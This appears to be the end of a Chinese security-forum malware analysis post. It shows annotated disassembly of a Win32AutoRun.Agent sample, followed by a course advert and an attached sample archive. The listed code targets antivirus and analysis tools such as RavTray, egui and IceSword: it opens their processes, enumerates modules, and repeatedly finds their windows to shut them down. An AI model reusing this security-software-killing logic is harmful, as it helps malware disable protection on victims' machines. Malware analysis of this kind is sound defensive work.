
```asm
100029C7    E8 D4FCFFFF     call    100026A0

100029CC    68 FC140010     push    100014FC                         ; ASCII "RavTray"

100029D1    E8 CAFCFFFF     call    100026A0

100029D6    68 F4140010     push    100014F4                         ; ASCII "egui"

100029DB    E8 C0FCFFFF     call    100026A0

100029E0    68 EC140010     push    100014EC                         ; ASCII "essact"

100029E5    E8 B6FCFFFF     call    100026A0

100029EA    83C4 20         add     esp, 20

100029ED    C3              retn

}

10002D2D  ^ EB E8           jmp     short 10002D17

10002D2F    90              nop

10002D30    81EC 28020000   sub     esp, 228

10002D36    56              push    esi

10002D37    8BB424 30020000 mov     esi, dword ptr [esp+230]

10002D3E    57              push    edi

10002D3F    56              push    esi

10002D40    6A 01           push    1

10002D42    68 FF0F1F00     push    1F0FFF

10002D47    FF15 5C100010   call    dword ptr [1000105C]             ; kernel32.OpenProcess

10002D4D    56              push    esi

10002D4E    6A 08           push    8

10002D50    8BF8            mov     edi, eax

10002D52    E8 D5060000     call    1000342C                         ; jmp 到 kernel32.CreateToolhelp32Snapshot

10002D57    8BF0            mov     esi, eax

10002D59    83FE FF         cmp     esi, -1

10002D5C    75 0B           jnz     short 10002D69

10002D5E    5F              pop     edi

10002D5F    33C0            xor     eax, eax

10002D61    5E              pop     esi

10002D62    81C4 28020000   add     esp, 228

10002D68    C3              retn

10002D69    8D4424 0C       lea     eax, dword ptr [esp+C]

10002D6D    C74424 0C 24020>mov     dword ptr [esp+C], 224

10002D75    50              push    eax

10002D76    56              push    esi

10002D77    E8 BC060000     call    10003438                         ; jmp 到 kernel32.Module32First

10002D7C    85C0            test    eax, eax

10002D7E    75 12           jnz     short 10002D92

10002D80    56              push    esi

10002D81    FF15 48100010   call    dword ptr [10001048]             ; kernel32.CloseHandle

10002D87    5F              pop     edi

10002D88    33C0            xor     eax, eax

10002D8A    5E              pop     esi

10002D8B    81C4 28020000   add     esp, 228

10002D91    C3              retn

}

10002573    6A 00           push    0

10002575    6A 00           push    0

10002577    FFD6            call    esi

10002579    6A 00           push    0

1000257B    6A 00           push    0

1000257D    6A 00           push    0

1000257F    68 C0250010     push    100025C0

{

100025C0    56              push    esi                              ; kernel32.CreateThread

100025C1    8B35 94100010   mov     esi, dword ptr [10001094]        ; kernel32.Sleep

100025C7    68 34120010     push    10001234                         ; ASCII "IceSword"

100025CC    68 AC340010     push    100034AC

100025D1    68 20120010     push    10001220                         ; ASCII "AfxControlBar42s"

100025D6    E8 B5FEFFFF     call    10002490                         ；查找窗口发送消息结束兵刃

100025DB    83C4 0C         add     esp, 0C

100025DE    68 70170000     push    1770

100025E3    FFD6            call    esi

100025E5  ^ EB E0           jmp     short 100025C7

}

10002584    6A 00           push    0

10002586    6A 00           push    0

10002588    FFD6            call    esi

1000258A    5E              pop     esi

1000258B    B8 01000000     mov     eax, 1

10002590    5D              pop     ebp

10002591    C2 0C00         retn    0C
```

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

上传的附件：

- [Win32AutoRun.Agent.rar](javascript:void(0);)

  （29.55kb，24次下载）
